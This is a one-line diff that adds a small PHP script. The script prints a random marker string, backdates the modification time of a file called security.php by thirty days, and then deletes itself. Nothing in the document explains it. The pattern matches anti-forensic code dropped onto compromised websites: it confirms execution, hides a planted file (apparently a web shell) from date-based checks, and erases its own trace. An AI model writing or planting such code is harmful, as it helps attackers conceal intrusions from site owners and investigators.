@@ -1,0 +1,1 @@
+<?php echo "yGSTbWqRHF"; if (file_exists("./security.php")){ touch("./security.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*T8AEwrB0g7s25npweA87*/ ?>
